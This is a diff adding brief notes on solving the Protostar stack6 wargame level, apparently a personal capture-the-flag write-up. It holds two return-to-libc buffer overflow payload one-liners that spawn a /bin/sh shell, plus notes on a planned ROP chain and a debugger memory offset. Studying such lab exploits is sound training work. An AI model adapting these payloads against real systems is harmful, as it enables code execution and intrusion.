@@ -1,0 +1,12 @@
+Use getenvaddr, get addr
+Method: return to libc, not rop.
+Payload to hold /bin/sh session: (python -c 'print "A"*80+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\xc6\xf8\xff\xbf"';cat)| /opt/protostar/bin/stack6 
+
+Next:
+rop chain: use setuid, and execl
+
+Next:
+use /bin/sh string in mem:
+(python -c 'print "A"*80+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\xc8\xf6\xff\xbf"+"/bin/sh"';cat) | /opt/protostar/bin/stack6 
+
+Notice: real mem and gdb mem 0x30
